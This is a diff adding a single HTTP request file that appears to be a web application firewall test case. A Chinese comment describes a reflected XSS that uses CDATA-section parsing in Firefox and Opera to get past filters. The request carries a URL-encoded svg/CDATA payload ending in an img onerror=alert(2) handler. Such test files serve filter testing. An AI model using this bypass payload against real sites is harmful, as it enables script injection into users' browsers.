@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_事件_数据混淆类(CDATA部分解析绕过)-06506803
+# CDATA 部分解析问题，Firefox 和 Opera 允许在 HTML 中使用 CDATA 部分分隔符 - 以剥离形式“<![”以及包括像“<![CDATA[”这样的填充。这可能会导致过滤器机制出现问题，这些分隔符可用于大规模混淆。
+GET /?id=%3Csvg%3E%3C%21%5BCDATA%5B%3E%3Cimage%20xlink:href=%22%5D%5D%3E%3Cimg%20src=xx:x%20onerror=alert%282%29%2F%2F%22%3E%3C%2Fsvg%3E&bid=hd_tag_m8mv251k HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv251k
+RM-PRO-Token: 45e64190771afa46fce853c1bb0a119e
+RM-PRO-Time: 1742808430902
+User-Agent: curl/7.83.1
+
